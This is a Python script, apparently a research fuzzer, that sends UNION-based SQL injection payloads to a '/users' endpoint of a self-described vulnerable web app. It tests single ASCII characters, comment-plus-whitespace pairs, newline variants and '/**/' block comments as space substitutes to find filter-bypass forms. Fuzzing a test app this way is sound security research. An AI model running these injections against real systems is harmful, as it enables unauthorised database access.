#!/usr/bin/env python3
"""
PostgreSQL Whitespace HTTP Fuzzer
Tests whitespace characters through a vulnerable web app.
"""

import requests
import sys
import urllib.parse
from fuzzer_utils import get_char_description


def main():
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    outfile = sys.argv[2] if len(sys.argv) > 2 else "pg_http_whitespace_results.txt"

    print(f"Target: {base_url}")
    print(f"Output: {outfile}")

    # Test baseline
    print("\nTesting baseline...")
    try:
        r = requests.get(f"{base_url}/users?id=1", timeout=5)
        baseline = r.json()
        print(f"  Baseline response: {baseline}")
    except Exception as e:
        print(f"  ERROR: {e}")
        return 1

    # Test basic UNION injection
    print("\nTesting basic UNION injection...")
    try:
        # 1 UNION SELECT 1,2,3,4--
        payload = "1 UNION SELECT 1,'test','test@test.com','user'--"
        r = requests.get(f"{base_url}/users", params={"id": payload}, timeout=5)
        print(f"  Basic UNION: {r.text[:100]}...")
    except Exception as e:
        print(f"  ERROR: {e}")

    results = []
    results.append("# PostgreSQL HTTP Whitespace Fuzzing Results")
    results.append(f"Target: {base_url}")
    results.append("")

    # Single character whitespace test (0x00-0x7F)
    print("\n" + "="*60)
    print("Phase 1: Single character whitespace (0x00-0x7F)")
    print("Payload: 1{char}UNION{char}SELECT{char}1,'a','b','c'--")
    print("="*60)

    single_valid = []

    for i in range(128):
        char = chr(i)
        # URL encode for display purposes
        encoded = urllib.parse.quote(char, safe='')

        # Build payload: 1{char}UNION{char}SELECT{char}...
        payload = f"1{char}UNION{char}SELECT{char}1,'test','test@test.com','user'--"

        try:
            r = requests.get(f"{base_url}/users", params={"id": payload}, timeout=5)
            # Check if we got 2 results (original + injected)
            data = r.json()
            if "users" in data and len(data["users"]) >= 2:
                single_valid.append(i)
                print(f"  0x{i:02X} ({encoded:6}) - VALID")
        except Exception:
            pass

    results.append("## Single Character Whitespace")
    results.append("")
    if single_valid:
        results.append("| Hex  | Dec | URL Encoded | Description |")
        results.append("| ---- | --- | ----------- | ----------- |")
        for i in single_valid:
            desc = get_char_description(i)
            results.append(f"| 0x{i:02X} | {i:3} | %{i:02X}        | {desc} |")
    else:
        results.append("No valid single-character whitespace found via HTTP")

    # Double character test with -- comment
    print("\n" + "="*60)
    print("Phase 2: Comment bypass (--{ws}{ws})")
    print("Payload: 1 UNION--{char1}{char2}SELECT 1,'a','b','c'")
    print("="*60)

    ws_chars = [0x09, 0x0A, 0x0C, 0x0D, 0x20]
    comment_valid = []

    for i in range(128):
        for j in ws_chars:
            char1 = chr(i)
            char2 = chr(j)

            payload = f"1 UNION--{char1}{char2}SELECT 1,'test','test@test.com','user'"

            try:
                r = requests.get(f"{base_url}/users", params={"id": payload}, timeout=5)
                data = r.json()
                if "users" in data and len(data["users"]) >= 2:
                    if i not in ws_chars:  # Only log unexpected ones
                        comment_valid.append((i, j))
                        print(f"  0x{i:02X} + 0x{j:02X} - VALID (unexpected!)")
            except Exception:
                pass

    # Test -- with newlines specifically
    print("\n" + "="*60)
    print("Phase 3: Comment newline variations")
    print("="*60)

    newline_tests = [
        ("\n", "LF only"),
        ("\r", "CR only"),
        ("\r\n", "CRLF"),
        ("\n\n", "Double LF"),
        (" \n", "Space + LF"),
        ("\t\n", "Tab + LF"),
    ]

    for chars, desc in newline_tests:
        payload = f"1 UNION--{chars}SELECT 1,'test','test@test.com','user'"
        try:
            r = requests.get(f"{base_url}/users", params={"id": payload}, timeout=5)
            data = r.json()
            if "users" in data and len(data["users"]) >= 2:
                print(f"  {desc}: VALID")
            else:
                print(f"  {desc}: blocked")
        except Exception as e:
            print(f"  {desc}: error - {e}")

    results.append("")
    results.append("## Comment Bypass (--)")
    results.append("")
    if comment_valid:
        results.append("Unexpected combinations that work:")
        results.append("")
        results.append("| Byte 1 | Byte 2 | URL Encoded |")
        results.append("| ------ | ------ | ----------- |")
        for i, j in comment_valid[:20]:
            results.append(f"| 0x{i:02X}   | 0x{j:02X}   | %{i:02X}%{j:02X}        |")
    else:
        results.append("No unexpected comment bypass combinations found")

    # Test /**/ comment as whitespace
    print("\n" + "="*60)
    print("Phase 4: Block comment /**/ as whitespace")
    print("="*60)

    payload = "1/**/UNION/**/SELECT/**/1,'test','test@test.com','user'--"
    try:
        r = requests.get(f"{base_url}/users", params={"id": payload}, timeout=5)
        data = r.json()
        if "users" in data and len(data["users"]) >= 2:
            print("  /**/: VALID")
            results.append("")
            results.append("## Block Comment /**/")
            results.append("Block comments work as whitespace substitute: YES")
        else:
            print("  /**/: blocked")
    except Exception as e:
        print(f"  /**/: error - {e}")

    # Write results
    with open(outfile, 'w') as f:
        f.write('\n'.join(results))

    print("\n" + "=" * 60)
    print(f"Results written to: {outfile}")
    print("=" * 60)

    # Summary
    print("\nSUMMARY:")
    print(f"  Single char whitespace via HTTP: {len(single_valid)}")
    print(f"  Characters: {[hex(x) for x in single_valid]}")

    return 0

if __name__ == "__main__":
    sys.exit(main())
